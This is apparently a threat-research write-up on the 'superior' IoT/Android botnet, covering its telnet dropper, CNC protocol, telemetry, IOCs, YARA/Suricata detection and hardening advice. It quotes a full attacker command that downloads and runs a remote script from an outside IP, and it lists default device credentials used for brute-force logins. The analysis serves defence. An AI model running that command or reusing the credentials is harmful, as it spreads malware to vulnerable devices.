superior: a build that kept its debug info

The superior IoT/Android bot end to end: telnet dropper, a DWARF build, its modules, the CNC protocol with a decoder, telemetry and IOCs. New findings marked.

superior is a musl C bot for routers, DVRs and Android TV boxes. eFeSpain reported it first and in depth: Superior series, chapters 35–37. Delivery

Every session came over telnet with stock IoT logins: admin/admin, root/root, root/GM8182, default/default, root/admin, admin/BrAhMoS@15. Then:

cd /tmp||cd /var/run||cd /dev/shm;busybox wget -q -O .y hxxp://77.239.124[.]167/s||wget -q -O .y hxxp://77.239.124[.]167/s||toybox wget -O .y hxxp://77.239.124[.]167/s||curl -fsSL hxxp://77.239.124[.]167/s -o .y;TAG=acer sh .y 2>/dev/null; echo DROPPED

First binaries on 4–6 November (superior.arm7, superior.arm4 requested). Main wave on 11 November: 216 dropper runs and four dropper revisions in one day.

The /s dropper

A 12–14 KB commented POSIX sh script (“superior — telnet dropper (/s)”). In order:

  1. Beacon hxxp://77.239.124[.]167:8099/b/s/<hostname>.
  2. Pick the arch from uname -m, getprop ro.product.cpu.abi and /proc/cpuinfo, then override it by reading e_machine/EI_DATA from /bin/sh with od, hexdump or xxd (routers that say mips but run little-endian).
  3. New: report hxxp://195.178.110[.]91:18081/s/arch-<arch>.
  4. Find an executable dir by writing and running a probe in $HOME, /var/tmp, /dev/shm, /tmp, /data/local/tmp, /mnt.
  5. Fetch superior.<arch> with any of 17 methods: curl, wget, busybox, toybox, uclient-fetch, fetch, ftp, python, perl, php, ruby, node, tftp, or a hand-written GET over nc, /dev/tcp or socat. Require ELF magic or >100 KB.
  6. Report /s/fetched-<arch>, test CNC TCP 29444 with nc -z, report /s/launch-<arch>-<nc-ok|nc-blocked|nc-absent>-<path>.
  7. Run ~/.superior.<arch> <tag>. SUPERIOR_INSTANCE_GEN=v7 lets a new build retire old ones.

The telemetry steps give the operator a per-arch count of failed installs, presumably.

CNC protocol

Added 18 November, from the debug build. Not yet checked against live traffic. eFeSpain ch. 36 first described the announcement and its fixed key; the command side is New.

Transport. Raw TCP to 29444, alternating with 14444 after a failed connect. The built-in TLS client is never enabled for the CNC in this build.

Announcement (bot → CNC). One frame, BE16 length | ciphertext, ChaCha20 under a key, nonce and counter fixed in the sample, so anyone can decrypt it. Fields: 00 00 00 0d, arch, version (superior-v21), cores, RAM, label, root flag, cmdline, CPU model, a fresh X25519 public key, an 8-byte device id. New: since everything is fixed, ciphertext bytes 2–5 are always a8 31 f0 21, on any port.

Keys. session = BLAKE2s(X25519(eph_priv, CNC_STATIC_PUB) | eph_pub | CNC_STATIC_PUB), mac = BLAKE2s(key=session, "mac"). Not recoverable from a capture alone.

CNC → bot (New). A 2-byte big-endian header picks the message; each ends with an 8-byte truncated BLAKE2s MAC. Control messages are plaintext, so a capture shows them without any key.

Attack plaintext is Mirai-like: vector | BE16 seconds | n targets | n × (IPv4, mask) | n options | n × (key, len, value). This build registers 39 vector ids.

Bot → CNC afterwards. Only a plaintext 00 00 keepalive and the challenge echo. Status goes to TCP 5821 as plain lines (New formats): [BOOT]|id=…|up=…, [SYSINFO]|uptime=…|kernel=…, [SELF]|pid=…, [BENCHMARK]…, [ANALYST]|kind=debugger.

Detection

YARA (matches all 6 samples, none of ~790 other captures), Suricata rules for the telemetry, beacon, CNC ports, announcement bytes, status lines, C2 domain and fetches, and an offline decoder for captured CNC streams: github.com/ChrisSewell/superior-botnet (CC BY 4.0).

Hardening: disable telnet and default creds on routers, DVRs and cameras; disable network ADB on TV boxes and isolate them; watch for listeners on 5555 and unknown Magisk modules.

Open: check the decoder against live traffic; the mesh protocol.
